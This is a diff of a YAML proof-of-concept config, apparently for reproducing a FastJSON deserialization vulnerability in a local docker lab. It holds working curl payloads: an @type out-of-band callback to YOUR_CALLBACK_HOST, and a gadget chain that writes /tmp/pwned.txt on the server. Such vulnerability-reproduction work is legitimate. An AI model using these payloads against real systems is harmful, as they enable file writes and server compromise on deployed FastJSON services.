@@ -110,22 +110,13 @@ poc:
   nuclei:
     - "vt-vlife.nuclei.yaml"
   manual:
-    steps:
-      - "1. docker-compose up -d --build"
-      - "2. Wait for application startup (~60s)"
-      - "3. Send crafted JSON to POST /login with @type payload"
-      - "4. Verify OOB callback or file write on server"
+    - "1. docker-compose up -d --build"
+    - "2. Wait for application startup (~60s)"
+    - "3. Send crafted JSON to POST /login with @type payload"
+    - "4. Verify OOB callback or file write on server"
   curl_examples:
-    - name: "FastJSON deserialization OOB test"
-      command: |
-        curl -s -X POST http://localhost:8288/vlife/login \
-          -H "Content-Type: application/json" \
-          -d '{"@type":"java.net.Inet4Address","val":"YOUR_CALLBACK_HOST"}'
-    - name: "FastJSON file write PoC"
-      command: |
-        curl -s -X POST http://localhost:8288/vlife/login \
-          -H "Content-Type: application/json" \
-          -d '{"@type":"sun.rmi.server.MarshalOutputStream","out":{"@type":"java.util.zip.InflaterOutputStream","out":{"@type":"java.io.FileOutputStream","file":"/tmp/pwned.txt","append":false},"infl":{"input":{"array":"eJwL8nUyNDJSyCxWyEgtSgUAHKUENw=="}},"bufLen":1048576},"protocolVersion":1}'
+    - "FastJSON deserialization OOB test: curl -s -X POST http://localhost:8288/vlife/login -H \"Content-Type: application/json\" -d '{\"@type\":\"java.net.Inet4Address\",\"val\":\"YOUR_CALLBACK_HOST\"}'"
+    - "FastJSON file write PoC: curl -s -X POST http://localhost:8288/vlife/login -H \"Content-Type: application/json\" -d '{\"@type\":\"sun.rmi.server.MarshalOutputStream\",\"out\":{\"@type\":\"java.util.zip.InflaterOutputStream\",\"out\":{\"@type\":\"java.io.FileOutputStream\",\"file\":\"/tmp/pwned.txt\",\"append\":false},\"infl\":{\"input\":{\"array\":\"eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==\"}},\"bufLen\":1048576},\"protocolVersion\":1}'"
 
 providers:
   docker-compose:
